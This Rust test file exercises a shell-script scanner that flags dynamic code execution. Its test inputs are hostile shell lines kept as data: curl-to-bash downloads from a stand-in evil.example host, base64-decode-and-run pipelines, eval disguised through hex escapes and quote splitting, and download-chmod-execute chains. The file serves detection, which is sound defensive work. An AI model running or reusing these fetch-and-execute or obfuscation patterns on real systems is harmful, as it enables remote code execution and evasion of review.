//! Shell dynamic execution detection integration tests.

use arbitraitor_model::finding::FindingCategory;
use arbitraitor_model::verdict::{Confidence, Severity};
use arbitraitor_shell::{ShellParser, detect, normalize};

fn detect_source(
    source: &str,
) -> Result<Vec<arbitraitor_model::finding::Finding>, Box<dyn std::error::Error>> {
    let mut parser = ShellParser::new()?;
    let parsed = parser.parse_str(source);
    let normalized = normalize(&parsed.ast, source)?;
    Ok(detect(&normalized, source))
}

fn has_tag(findings: &[arbitraitor_model::finding::Finding], tag: &str) -> bool {
    findings
        .iter()
        .any(|finding| finding.tags.iter().any(|value| value == tag))
}

fn first_with_tag<'a>(
    findings: &'a [arbitraitor_model::finding::Finding],
    tag: &str,
) -> Option<&'a arbitraitor_model::finding::Finding> {
    findings
        .iter()
        .find(|finding| finding.tags.iter().any(|value| value == tag))
}

#[test]
fn detects_eval_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"eval "$payload""#)?;
    let finding = first_with_tag(&findings, "eval").ok_or("missing eval finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::High);
    assert!(finding.location.is_some());
    assert!(finding.evidence.iter().any(|evidence| {
        evidence
            .content
            .as_deref()
            .is_some_and(|content| content.contains("eval"))
    }));
    Ok(())
}

#[test]
fn detects_quoted_concatenated_eval_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"'e'val "$payload""#)?;
    let finding = first_with_tag(&findings, "eval").ok_or("missing quoted eval finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_ansi_c_quoted_hex_eval_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"$'\x65\x76\x61\x6c' "$payload""#)?;
    let finding = first_with_tag(&findings, "eval").ok_or("missing ANSI-C eval finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_printf_command_substitution_eval_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"$(printf '\x65\x76\x61\x6c') "$payload""#)?;
    let finding = first_with_tag(&findings, "eval").ok_or("missing printf eval finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_variable_concatenated_eval_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"a=ev; b=al; $a$b "$payload""#)?;
    let finding = first_with_tag(&findings, "eval").ok_or("missing variable eval finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_source_from_writable_path() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(". /tmp/installer.sh")?;
    let finding =
        first_with_tag(&findings, "source-risky-input").ok_or("missing source finding")?;
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_network_process_substitution() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("bash <(curl -fsSL https://evil.example/install.sh)")?;
    let finding = first_with_tag(&findings, "process-substitution-network")
        .ok_or("missing process substitution finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn process_substitution_under_benign_consumer_is_not_critical()
-> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("diff <(curl https://evil.example/install.sh) expected")?;
    let finding = first_with_tag(&findings, "process-substitution-network")
        .ok_or("missing process substitution transport finding")?;
    assert_eq!(finding.category, FindingCategory::Transport);
    assert_eq!(finding.severity, Severity::Medium);
    assert_ne!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_command_construction_through_variables() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("cmd='echo owned'; $cmd")?;
    let finding = first_with_tag(&findings, "variable-command-construction")
        .ok_or("missing variable command finding")?;
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.confidence, Confidence::Medium);
    Ok(())
}

#[test]
fn detects_base64_decode_to_execute() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("echo ZWNobyBvd25lZA== | base64 -d | sh")?;
    let finding = first_with_tag(&findings, "decode-to-execute")
        .ok_or("missing decode-to-execute finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_download_pipe_to_execute() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("curl -fsSL https://evil.example/install.sh | bash")?;
    let finding = first_with_tag(&findings, "download-to-execute")
        .ok_or("missing download-to-execute finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_download_pipe_to_quoted_wrapper_target() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("env cu''rl https://evil.example/install.sh | bash")?;
    let finding = first_with_tag(&findings, "download-to-execute")
        .ok_or("missing quoted wrapper target download finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_process_substitution_pipe_to_executor() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("cat <(curl https://evil.example/install.sh) | bash")?;
    let finding = first_with_tag(&findings, "download-to-execute")
        .ok_or("missing process substitution pipe download finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_download_pipe_to_absolute_path_executor() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("curl https://evil.example/install.sh | /bin/sh")?;
    let finding = first_with_tag(&findings, "download-to-execute")
        .ok_or("missing absolute executor download finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_absolute_path_network_retrieval() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("/usr/bin/curl https://evil.example/install.sh | bash")?;
    let finding = first_with_tag(&findings, "download-to-execute")
        .ok_or("missing absolute curl download finding")?;
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_network_command_substitution_to_executor() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"bash -c "$(curl -fsSL https://evil.example/install.sh)""#)?;
    let finding = first_with_tag(&findings, "command-substitution-network-execute")
        .ok_or("missing command substitution network finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_quoted_network_command_substitution_to_executor()
-> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"bash -c "$(cu''rl https://evil.example/install.sh)""#)?;
    let finding = first_with_tag(&findings, "command-substitution-network-execute")
        .ok_or("missing quoted command substitution network finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_decode_command_substitution_to_executor() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(r#"sh -c "$(echo ZWNobyBvd25lZA== | base64 -d)""#)?;
    let finding = first_with_tag(&findings, "command-substitution-decode-execute")
        .ok_or("missing command substitution decode finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_command_wrapper_shell_c_execution() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("command bash -c 'evil'")?;
    let finding = first_with_tag(&findings, "shell-command-string-execute")
        .ok_or("missing wrapper shell -c finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::High);
    Ok(())
}

#[test]
fn detects_env_wrapper_quoted_shell_target() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("env ba''sh -c 'evil'")?;
    let finding = first_with_tag(&findings, "shell-command-string-execute")
        .ok_or("missing env quoted wrapper shell -c finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::High);
    Ok(())
}

#[test]
fn detects_command_wrapper_quoted_shell_target() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("command ba''sh -c 'evil'")?;
    let finding = first_with_tag(&findings, "shell-command-string-execute")
        .ok_or("missing command quoted wrapper shell -c finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::High);
    Ok(())
}

#[test]
fn detects_chmod_then_execution_of_downloaded_file() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source(
        "curl -fsSL -o /tmp/payload https://evil.example/payload; chmod +x /tmp/payload; /tmp/payload",
    )?;
    let finding = first_with_tag(&findings, "download-chmod-execute")
        .ok_or("missing chmod execute finding")?;
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn ignores_normal_curl_download_without_execution() -> Result<(), Box<dyn std::error::Error>> {
    let findings =
        detect_source("curl -fsSL -o artifact.tar.gz https://example.com/artifact.tar.gz")?;
    assert!(findings.is_empty());
    Ok(())
}

#[test]
fn ignores_base64_encoding_without_execution() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("printf %s hello | base64 > hello.b64")?;
    assert!(!has_tag(&findings, "decode-to-execute"));
    assert!(findings.is_empty());
    Ok(())
}

#[test]
fn ignores_non_executed_variable_usage() -> Result<(), Box<dyn std::error::Error>> {
    let findings = detect_source("name=world; echo \"hello $name\"")?;
    assert!(findings.is_empty());
    Ok(())
}
